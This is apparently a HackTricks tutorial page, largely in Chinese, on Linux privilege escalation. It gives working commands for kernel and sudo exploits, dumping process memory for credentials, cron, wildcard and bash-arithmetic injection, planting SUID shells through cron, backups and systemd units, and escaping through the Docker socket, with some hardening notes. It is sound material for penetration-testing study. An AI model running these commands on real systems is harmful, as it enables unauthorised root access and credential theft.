# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### OS 信息

让我们开始收集有关正在运行的 OS 的一些信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH (路径)

如果你**对 `PATH` 变量内的任何文件夹具有写权限**，你可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中有有价值的信息、密码或 API 密钥吗？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，并查看是否存在可用于 escalate privileges 的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
您可以在这里找到一个不错的易受攻击内核列表以及一些已经 **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从这些网站提取所有易受攻击的内核版本，你可以做:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助搜索 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者主机上执行，仅检查针对 kernel 2.x 的 exploits）

始终 **在 Google 上搜索 kernel 版本**，可能你的 kernel 版本写在某个 kernel exploit 中，这样你就可以确定该 exploit 是有效的。

其他 kernel exploitation 技术：

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下内容中的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否易受攻击。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

在 1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许非特权本地用户在从用户可控目录使用 `/etc/nsswitch.conf` 文件时，通过 sudo `--chroot` 选项将权限提升为 root。

这里有一个 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) 用于利用该 [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)。在运行 exploit 之前，请确保你的 `sudo` 版本存在漏洞并且支持 `chroot` 功能。

欲了解更多信息，请参阅原始 [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，了解如何利用此 vuln 的 **示例**。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux（安全增强 Linux）
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

如果你在 container 内，先从以下 container-security 部分开始，然后转向 runtime-specific abuse 页面：


{{#ref}}
container-security/
{{#endref}}

## 磁盘

检查 **哪些已挂载和未挂载**、挂载位置以及原因。如果有未挂载的内容，你可以尝试将其挂载并检查敏感信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的 binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
此外，检查是否安装了 **any compiler is installed**。这在你需要使用某些 kernel exploit 时很有用，因为建议在你将要使用它的机器上（或在一台类似的机器上）编译它。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查 **已安装的包和服务的版本**。可能存在某些旧版 Nagios（例如）可以被利用来提升权限…\  
建议手动检查更可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该机器的 SSH 访问权限，也可以使用 **openVAS** 检查机器上安装的软件是否过时或存在已知漏洞。

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 或类似的应用来检查已安装的软件版本是否存在已知漏洞_

## 进程

查看正在运行的 **哪些进程** 并检查是否有任何进程拥有 **超过应有的权限**（例如 tomcat 以 root 身份运行？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否可能存在 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 会通过检查进程命令行中的 `--inspect` 参数来检测到它们。\
还要 **检查你对进程二进制文件的权限**，也许你可以覆盖别人的文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别经常被执行或在满足一组条件时被执行的易受攻击进程非常有用。

### 进程内存

服务器上的某些服务会以明文方式在内存中保存**凭证**。\
通常你需要 **root privileges** 才能读取属于其他用户的进程内存，因此这通常在你已经是 root 时更有用，用来发现更多凭证。\
然而，请记住 **作为普通用户你可以读取自己拥有的进程的内存**。

> [!WARNING]
> 注意现在大多数机器 **默认不允许 ptrace**，这意味着你无法转储属于其他非特权用户的进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**: 只要拥有相同的 uid，所有进程都可以被调试。这是 ptrace 传统的工作方式。
> - **kernel.yama.ptrace_scope = 1**: 只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**: 只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**: 不允许使用 ptrace 跟踪任何进程。设置后需要重启才能再次启用 ptrace。

#### GDB

如果你可以访问（例如）FTP 服务的内存，你可以获取 Heap 并在其中搜索凭证。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的虚拟地址空间内内存的映射方式**；它还显示了 **每个映射区域的权限**。**mem** 伪文件**暴露了进程的内存本身**。从 **maps** 文件中我们知道哪些 **内存区域是可读的** 以及它们的偏移。我们使用这些信息来**在 mem 文件中定位并导出所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 适用于 linux

ProcDump 是对经典 ProcDump 工具（来自 Sysinternals 的 Windows 工具套件）的 Linux 重新构想。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除对 root 的要求并转储属于你的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 从进程内存获取凭证

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以转储进程（参见前面的章节以查找转储进程内存的不同方法），并在内存中搜索凭证：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将**从内存窃取明文凭证**并从一些**已知文件**中获取凭证。它需要 root 权限才能正常工作。

| 功能                                             | 进程名               |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时/Cron 作业

### Crontab UI (alseambusher) 以 root 运行 – 基于网页的调度器 privesc

如果一个网页 “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行并且仅绑定到 loopback，你仍然可以通过 SSH 本地端口转发访问它并创建特权作业以提权。

典型链
- 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm，方法：`ss -ntlp` / `curl -v localhost:8000`
- 在运维工件中查找凭据：
  - 备份/脚本，使用 `zip -P <password>`
  - systemd 单元暴露了 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- 隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限任务并立即运行 (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI; 使用专用用户并赋予最低权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问; 不要重复使用密码
- 避免在 unit files 中嵌入 secrets; 使用 secret stores 或 root-only EnvironmentFile
- 为 on-demand job executions 启用 audit/logging

检查是否有 scheduled job 存在漏洞。也许你可以利用由 root 执行的脚本 (wildcard vuln? 能修改 root 使用的文件吗? 使用 symlinks? 在 root 使用的目录中创建特定文件?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 拥有写权限_)

如果在该 crontab 中 root 用户尝试在未设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
然后，你可以通过以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带有通配符的脚本 (Wildcard Injection)

如果脚本以 root 身份执行且命令中包含 “**\***”，你可以利用这一点导致意想不到的行为（例如 privesc）。示例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面是像** _**/some/path/\***_ **这样的路径，则它不易受攻击（即使** _**./\***_ **也不受攻击）。**

阅读以下页面以获取更多关于通配符利用的技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...)), $((...)) 和 let 中的算术求值之前会执行 parameter expansion 和 command substitution。如果一个 root cron/parser 读取不受信任的日志字段并将它们传入算术上下文，攻击者可以注入一个 command substitution $(...)，当 cron 运行时该命令将以 root 身份执行。

- Why it works: 在 Bash 中，扩展按以下顺序发生：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。因此像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行命令），然后剩下的数字 `0` 用于算术计算，从而让脚本继续而不报错。

- 典型的易受攻击模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 让攻击者控制的文本写入被解析的日志，使看起来是数字的字段包含一个 command substitution 并以数字结尾。确保你的命令不向 stdout 输出（或重定向它），以便算术仍然有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **can modify a cron script**（该脚本由 root 执行），就可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的 script 使用了一个 **你拥有完全访问权限的 directory**，那么删除该 folder 并 **创建一个指向另一个的 symlink folder**（托管由你控制的 script）可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 符号链接验证和更安全的文件处理

在审核以路径读取或写入文件的提权脚本/二进制文件时，确认链接是如何被处理的：

- `stat()` 会跟随符号链接并返回目标的元数据。
- `lstat()` 返回链接自身的元数据。
- `readlink -f` 和 `namei -l` 有助于解析最终目标并显示每个路径组件的权限。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **在 1 分钟内每 0.1 秒监控**, **按执行次数较少排序** 并删除被执行次数最多的命令，你可以做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (它会监控并列出每个启动的进程)。

### 保存攻击者设置的模式位的 root 备份 (pg_basebackup)

如果一个由 root 拥有的 cron 封装了 `pg_basebackup`（或任何递归复制）针对你有写权限的数据库目录，你可以植入一个 **SUID/SGID binary**，它将以相同的模式位被重新复制为 **root:root** 到备份输出中。

典型发现流程（作为低权限 DB 用户）:
- 使用 `pspy` 发现 root 的 cron 每分钟调用类似 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 的命令。
- 确认源集群（例如 `/var/lib/postgresql/14/main`）对你可写，并且该任务运行后目标（`/opt/backups/current`）会变为 root 所有。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
这是可行的，因为 `pg_basebackup` 在复制集群时会保留文件模式位；当由 root 调用时，目标文件继承 **root ownership + attacker-chosen SUID/SGID**。任何类似的具有特权的备份/复制例程，只要保留权限并写入可执行位置，就会存在漏洞。

### 隐蔽的 cronjob

可以创建一个 cronjob，方法是在注释后放置一个回车（没有换行字符），cronjob 仍然会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你 **可以修改它**，使其 **执行** 你的 **backdoor 当** 服务 **启动**、**重启** 或 **停止** 时（可能需要等到机器重启）。\  
例如在 `.service` 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service 二进制文件

请记住，如果你对**服务正在执行的二进制文件拥有写权限**，你可以将它们更改为 backdoors，这样当服务被重新执行时，backdoors 就会被执行。

### systemd PATH - Relative Paths

你可以用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现可以在路径中的任意文件夹中**write**，你可能能够**escalate privileges**。你需要在类似下面这样的 service configurations 文件中搜索使用了**relative paths being used on service configurations**的情况：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的 systemd PATH 文件夹中创建一个与相对路径二进制文件同名的 **executable**，当服务被要求执行易受攻击的动作（**Start**, **Stop**, **Reload**）时，你的 **backdoor** 将被执行（非特权用户通常无法 start/stop 服务，但检查你是否可以使用 `sudo -l`）。

**使用 `man systemd.service` 了解有关服务的更多信息。**

## **计时器**

计时器是 systemd 单元文件，其名称以 `**.timer**` 结尾，用于控制 `**.service**` 文件或事件。计时器可以作为 cron 的替代方案，因为它们内置对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以通过以下命令列出所有计时器：
```bash
systemctl list-timers --all
```
### 可写定时器

如果你可以修改一个定时器，你就可以让它执行 systemd.unit 的某些现有单元（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以看到 Unit 的定义：

> 当此 timer 到期时要激活的 Unit。该参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，该值默认指向一个与 timer unit 同名但后缀不同的 service。（见上文。）建议被激活的 unit 名称与 timer unit 的 unit 名称除后缀外保持一致。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），该 unit 正在**执行一个可写的二进制文件**
- 找到某个 systemd unit，它正在**执行一个相对路径**，并且你对**systemd PATH**拥有**可写权限**（以冒充该可执行文件）

**通过 `man systemd.timer` 了解更多关于 timers 的信息。**

### **启用 Timer**

要启用一个 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意，**timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来**激活**的。

## 套接字

Unix Domain Sockets (UDS) 在客户端-服务器模型中允许在同一台或不同机器之间进行**进程间通信**。它们使用标准 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行配置。

套接字可以使用 `.socket` 文件进行配置。

**了解更多关于套接字的信息，请参阅 `man systemd.socket`。** 在该文件中，可配置多个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于**指示将监听的位置**（AF_UNIX socket 文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果 **true**，则会为每个传入连接生成一个**服务实例**，并且仅将连接套接字传递给它。如果 **false**，所有监听套接字本身会被**传递给已启动的 service 单元**，并且仅为所有连接生成一个 service 单元。对于 datagram 套接字和 FIFO，此值被忽略，因为单个 service 单元无条件地处理所有传入流量。**默认值为 false**。出于性能原因，建议以适合 `Accept=no` 的方式编写新的守护进程。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令会在监听的 **sockets**/FIFOs 分别被**创建**并绑定之前或之后被**执行**。命令行的第一个标记必须是一个绝对文件名，后跟进程参数。
- `ExecStopPre`, `ExecStopPost`: 额外的**命令**，在监听的 **sockets**/FIFOs 被**关闭**并移除之前或之后被**执行**。
- `Service`: 指定在**接收到流量**时要**激活**的 **service 单元** 名称。此设置仅对 `Accept=no` 的套接字允许。默认值为与套接字同名的服务（替换后缀）。在大多数情况下不需要使用此选项。

### 可写的 .socket 文件

如果你发现一个**可写**的 `.socket` 文件，你可以在 `[Socket]` 部分的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，backdoor 将在套接字创建之前被执行。因此，你**可能需要等到机器重启**。\
_注意系统必须正在使用那个 socket 文件配置，否则 backdoor 不会被执行_

### Socket activation + writable unit path (create missing service)

另一个高影响的错误配置是：

- 一个带有 `Accept=no` 且 `Service=<name>.service` 的 socket 单元
- 所引用的 service 单元缺失
- 攻击者可以写入 `/etc/systemd/system`（或其他单元搜索路径）

在这种情况下，攻击者可以创建 `<name>.service`，然后触发流量到该 socket，使 systemd 加载并以 root 身份执行新的 service。

简要流程：
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 可写 sockets

如果你**识别到任何可写的 socket**（_现在我们讲的是 Unix Sockets，而不是 config `.socket` 文件_），那么**你可以与该 socket 通信**，并可能 exploit a vulnerability。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

请注意，可能存在一些 **sockets listening for HTTP** requests（_我不是指 .socket 文件，而是作为 unix sockets 的那些文件_）。你可以使用以下命令检查：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
如果该 socket **对 HTTP 请求有响应**，那么你可以与其**通信**，并可能**exploit some vulnerability**。

### Writable Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写访问权限，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 级别访问主机的文件系统。

#### **直接使用 Docker API**

在无法使用 Docker CLI 的情况下，仍然可以通过 Docker API 和 `curl` 命令操作 Docker socket。

1.  **列出 Docker 镜像：** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：** 发送请求创建一个将主机根目录挂载进去的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **附加到容器：** 使用 `socat` 建立与容器的连接，从而在容器内执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

建立 `socat` 连接后，你可以在容器中直接执行命令，获得对主机文件系统的 root 级别访问。

### 其他

注意，如果你对 docker socket 有写权限，因为你**在 `docker` 组内**，你有[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看 **更多从容器逃逸或滥用容器运行时以提升权限的方法**：

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**你可能能够滥用它来提权**：

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为**你可能能够滥用它来提权**：

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

